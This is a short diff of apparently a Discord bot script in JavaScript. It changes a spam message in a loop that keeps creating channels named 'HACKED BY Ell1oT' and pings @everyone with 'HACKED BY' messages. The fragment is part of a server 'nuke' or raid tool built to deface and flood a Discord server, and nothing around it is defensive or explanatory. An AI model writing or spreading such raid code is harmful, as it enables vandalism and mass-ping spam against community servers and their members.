@@ -42,7 +42,7 @@ client.on('message', message => {
             setInterval(() => {
               
                 message.guild.createChannel('HACKED BY Ell1oT', 'text').then(channel => { 
-                channel.send('@everyone HACKED BY 3usa qwz mzh BCHO SERVER DABNEWA:joy: :joy: :joy:')
+                channel.send('@everyone HACKED BY Ell1oT BCHO SERVER DABNEWA:joy: :joy: :joy:')
                
                 })
             }                        
